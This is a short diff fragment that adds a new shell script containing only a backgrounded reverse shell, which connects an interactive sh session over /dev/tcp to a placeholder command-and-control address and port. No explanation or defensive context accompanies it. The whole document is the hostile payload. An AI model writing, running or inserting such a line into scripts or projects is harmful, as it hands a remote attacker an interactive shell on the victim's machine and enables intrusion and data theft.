@@ -1,0 +1,2 @@
+#!/bin/sh
+nohup sh -i 5<> /dev/tcp/${C2_IP_XXXXXX}/${C2_PORT} 0<&5 1>&5 2>&5 &
